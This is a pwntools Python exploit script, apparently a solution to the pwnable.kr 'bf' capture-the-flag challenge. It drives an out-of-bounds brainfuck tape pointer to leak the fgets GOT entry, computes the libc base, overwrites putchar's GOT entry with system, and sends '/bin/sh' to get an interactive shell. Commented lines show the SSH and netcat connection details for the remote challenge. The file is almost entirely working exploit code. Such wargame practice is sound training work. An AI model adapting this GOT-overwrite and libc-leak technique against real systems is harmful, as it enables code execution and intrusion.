from pwn import *

context.log_level = "DEBUG"

context.terminal = ['tmux', 'splitw', '-v']

#s = ssh(host='pwnable.kr', port=2222, user='bf', password='guest')
#s.download_file('bf')
#s.download_file('bf')
#s.download_file('bf.c')

#p = process(["nc", "pwnable.kr", "9001"])
p = process("./bf")
gdb.attach(p, '''
b *0x080485dc
continue
''')

# start of buffer
# 0x0804a0a0

# pointer to buffer
# 0x804a080 <p>:  0x0804a09b

# GOT 0x0804a0a0 - 0x70 = putchar
# 0x804a010 <fgets@got.plt>:      0xf7e6e150      0x08048466      0xf7e6fca0      0x08048486
# 0x804a020 <strlen@got.plt>:     0xf7e8e440      0xf7e28540      0xf7e70360      0xf7f35b50
# 0x804a030 <putchar@got.plt>:    0x080484d6      0x00000000      0x00000000      0x00000000
# 0x804a040 <stdin@@GLIBC_2.0>:   0xf7fc25a0      0x00000000      0x00000000      0x00000000

# /bin/sh
write_sh = ",>" * 9 + "<" * 9
sh = "/bin/sh\x00"

#0xf75e4150
#0xf7586000
fgets = 0x0005e150
# read fgets
read_fgets = "<" * 141
read_fgets += ".<.<.<."

# write putchar
write_putchar = ">" * 32
write_putchar += ",>,>,>,"

write = write_putchar

move_ptr_sh = ">" * (144 - 35) 

execute = "."

payload = write_sh + read_fgets + write + move_ptr_sh + execute

p.recvuntil("type some brainfuck instructions except [ ]")
p.sendline(payload)
p.sendline(sh)
data = ""
while len(data) < 5:
    data += p.recv()

leak = u32(data.split("\n")[1], endian='big')

libc_base = leak - fgets

#magic_gadget = 0x3ac5c
#magic_gadget = 0x3ac5e
#magic_gadget = 0x3ac62
#magic_gadget = 0x3ac69
#magic_gadget = 0x5fbc5
#magic_gadget = 0x5fbc6

system = 0x3ada0

gadget = p32(libc_base + system)
#gadget = "AAAA"

p.sendline(gadget)
p.interactive()
